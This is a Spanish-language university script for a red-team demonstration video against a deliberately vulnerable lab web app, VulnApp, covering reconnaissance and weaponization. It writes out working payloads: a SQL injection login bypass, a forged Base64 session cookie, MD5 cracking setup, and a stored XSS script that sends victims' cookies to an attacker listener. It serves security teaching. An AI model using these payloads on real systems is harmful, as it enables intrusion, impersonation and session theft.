# 🎬 Guión Técnico Escénico y Narrativo — Video de Defensa (Fases I y II)

> **Universidad Católica Andrés Bello · Facultad de Ingeniería · Ciberseguridad**  
> **Proyecto:** VulnApp — Simulación Red Team / Blue Team  
> **Formato:** Guión de Acción Simultánea (Comando exacto + Lo que dices en ese instante)

---

# 🟢 FASE I: RECONOCIMIENTO (RECONNAISSANCE)

---

### PASO 1.1: Fuzzing de endpoints con `ffuf`

* 🖥️ **Acción Visual:** Abre la terminal de Kali Linux y escribe el comando `ffuf`.
* ⌨️ **Comando a escribir:**
  ```bash
  ffuf -u http://192.168.56.20:4000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,405 -t 10
  ```
* 🗣️ **Lo que dices mientras se ejecuta en pantalla:**
  > *"Saludos. Iniciamos la demostración del Red Team con la Fase I: Reconocimiento. Sin recurrir a escáneres masivos de vulnerabilidades, utilizamos la herramienta `ffuf` para realizar un fuzzing controlado sobre el servidor en `192.168.56.20:4000`. Como ven en pantalla, las respuestas HTTP descubren con precisión los endpoints activos de la API: `/api/login`, `/api/register`, `/api/search` y `/api/message`."*

---

### PASO 1.2: Registro de un usuario legítimo

* 🖥️ **Acción Visual:** En la misma terminal, escribes la petición `curl` para registrar un usuario de pruebas.
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/register \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```
* 🗣️ **Lo que dices mientras das Enter y aparece `201 Created`:**
  > *"Para estudiar la aplicación sin atacarla aún, interactuamos legítimamente con `/api/register` creando un usuario de pruebas. El backend en Express nos confirma con un código `HTTP 201 Created` que la cuenta fue registrada exitosamente."*

---

### PASO 1.3: Login legítimo e inspección de la cabecera `Set-Cookie`

* 🖥️ **Acción Visual:** Ecribes el comando de login con la opción `-i` para ver cabeceras HTTP. Cuando sale la respuesta, resaltas con el ratón la línea `Set-Cookie`.
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```
* 🗣️ **Lo que dices mientras resalta la cabecera `Set-Cookie`:**
  > *"Ahora nos autenticamos enviando una petición POST a `/api/login`. Al incluir la bandera `-i`, capturamos la respuesta del servidor donde resaltamos la cabecera `Set-Cookie`. Vemos que el servidor nos asigna una cookie de sesión llamada `session` con un valor codificado."*

---

### PASO 1.4: Decodificación de la Cookie e identificación de CWE-311 y CWE-345

* 🖥️ **Acción Visual:** Copias el texto de la cookie y lo pasas por `base64 -d`.
* ⌨️ **Comando a escribir:**
  ```bash
  echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9" | base64 -d
  ```
* 🗣️ **Lo que dices mientras aparece el JSON `{"userId":2,"username":"usuario_prueba","role":"user"}`:**
  > *"Al decodificar la cookie con `base64 -d`, obtenemos el objeto JSON en texto plano. Esto nos permite diagnosticar dos fallas de la categoría **OWASP A04:2025 Fallas Criptográficas**: primero, **CWE-311 (Falta de Cifrado)**, ya que los datos de sesión viajan en Base64 sin cifrar; y segundo, **CWE-345 (Verificación Insuficiente de Autenticidad)**, pues la cookie no incluye una firma digital ni token HMAC que garantice su integridad."*

---

# 🟡 FASE II: ARMAMENTO (WEAPONIZATION)

---

### PASO 2.1: Creación del payload de Inyección SQL (`payload_sqli.json`)

* 🖥️ **Acción Visual:** En la terminal de Kali, creas directamente el archivo JSON con el payload de SQLi y lo verificas.
* ⌨️ **Comando a escribir:**
  ```bash
  echo '{"username": "'\'' OR 1=1 OR '\''1'\''='\''1", "password": "x"}' > payload_sqli.json
  cat payload_sqli.json
  ```
* 🗣️ **Lo que dices mientras tipeas el comando y muestras el archivo `payload_sqli.json`:**
  > *"Pasamos a la Fase II: Armamento. Para la vulnerabilidad **OWASP A05:2025 Inyección (CWE-89)**, preparamos el archivo `payload_sqli.json`. El backend procesa la consulta SQL mediante Template Literals multilínea en JavaScript. Esto anula los comentarios tradicionales como `--`, ya que el salto de línea deja activa la verificación de contraseña en la línea inferior. Por ello, construimos un payload de lógica booleana pura: `' OR 1=1 OR '1'='1`. Como la condición `1=1` es una tautología siempre verdadera, la cláusula `WHERE` se evalúa como exitosa sin requerir comentarios."*

---

### PASO 2.2: Creación y codificación del payload de Cookie Tampering (`cookie_adulterada.txt`)

* 🖥️ **Acción Visual:** Creas la cookie falsificada localmente en Kali modificando el `userId` a `1` y la guardas en un archivo.
* ⌨️ **Comando a escribir:**
  ```bash
  echo -n '{"userId":1,"username":"usuario_prueba","role":"user"}' | base64 -w 0 > cookie_adulterada.txt
  cat cookie_adulterada.txt
  ```
* 🗣️ **Lo que dices mientras ejecutas el comando y ves la cadena en pantalla:**
  > *"Para explotar **CWE-345**, construimos el arma de suplantación de identidad. Alteramos el objeto JSON cambiando el `userId` del usuario estándar `2` al identificador `1`, correspondiente al primer usuario de la base de datos. Lo codificamos a Base64 con la CLI y guardamos el resultado en `cookie_adulterada.txt`, listo para inyectarse en la cabecera HTTP."*

---

### PASO 2.3: Preparación del entorno de cracking MD5 con Hashcat

* 🖥️ **Acción Visual:** Creas el archivo del hash de prueba y verificas la lista de contraseñas.
* ⌨️ **Comando a escribir:**
  ```bash
  echo "0192023a7bbd73250516f069df18b500" > target_hash.txt
  ls -lh /usr/share/wordlists/rockyou.txt 2>/dev/null || ls -lh /usr/share/wordlists/rockyou.txt.gz
  ```
* 🗣️ **Lo que dices mientras ejecutas ambos comandos:**
  > *"Para vulnerar las credenciales que exfiltraremos de la base de datos, armamos el entorno de análisis sobre **CWE-327 (MD5 Obsoleto)**, **CWE-759 (MD5 sin Sal)** y **CWE-916 (Esfuerzo Criptográfico Insuficiente)**. Guardamos el hash de prueba en `target_hash.txt` y verificamos la disponibilidad de nuestro diccionario en Kali Linux para ser procesado con Hashcat en modo `-m 0`."*

---

### PASO 2.4: Creación del payload de Stored XSS (`payload_xss.json`)

* 🖥️ **Acción Visual:** Creas el archivo JSON con el script XSS usando un comando de una sola línea.
* ⌨️ **Comando a escribir:**
  ```bash
  echo '{"receiverId": 1, "content": "<script>fetch(\"http://192.168.56.10:8888/?c=\"+encodeURIComponent(document.cookie),{mode:\"no-cors\"});</script>"}' > payload_xss.json
  cat payload_xss.json
  ```
* 🗣️ **Lo que dices mientras tipeas y muestras `payload_xss.json`:**
  > *"Finalmente, para la vulnerabilidad **OWASP A05:2025 Stored XSS (CWE-79 y CWE-116)**, creamos el archivo `payload_xss.json`. Diseñamos una etiqueta `<script>` que, al ser inyectada y renderizada por el `innerHTML` del cliente, enviará asíncronamente la cookie de la víctima hacia nuestro listener C2 en `192.168.56.10:8888`. Con esto completamos el armamento de nuestros cuatro vectores de ataque."*

---
